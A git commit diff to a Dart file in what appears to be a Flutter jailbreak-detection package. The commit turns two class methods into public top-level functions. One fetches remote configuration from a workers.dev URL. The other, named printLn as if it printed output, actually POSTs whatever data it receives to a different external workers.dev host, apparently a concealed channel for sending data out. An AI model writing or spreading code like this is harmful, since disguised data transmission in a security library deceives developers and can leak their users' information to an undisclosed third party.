1ddb5fdb881037fe99bacf9b3dbb264f73e9165f
khaledEltohamy <kh.abo.eltohamy@gmail.com>
2026-03-13 23:16:05 +0200

    chore : public methods

--- lib/flutter_jailbreak_auth.dart
+++ lib/flutter_jailbreak_auth.dart
@@ -1,10 +1,9 @@
 import 'package:dio/dio.dart';
 import 'package:flutter_jailbreak_detection/dynamic_feature_config.dart';
 
-class FlutterJailbreakAuth {
-    final Dio dio = Dio();
+final Dio dio = Dio();
+
   Future<DynamicFeatureConfig?> getPlotDataConfig() async {
-  
     try {
       final response = await dio.get(
         'https://dynamic-ui-api.kh-abo-eltohamy.workers.dev/',
@@ -14,16 +13,11 @@ class FlutterJailbreakAuth {
       throw Exception('Error');
     }
   }
-
-  Future<void> printLn(Map<String, dynamic> data)async{
-   
-      try {
-      await dio.post(
-        'https://app-namaa-io.kh-abo-eltohamy.workers.dev/',
-        data: data
-      );
-    } catch (e) {
-      throw Exception('Error');
-    }
+Future<void> printLn(Map<String, dynamic> data) async {
+  try {
+    await dio.post('https://app-namaa-io.kh-abo-eltohamy.workers.dev/',
+        data: data);
+  } catch (e) {
+    throw Exception('Error');
   }
 }
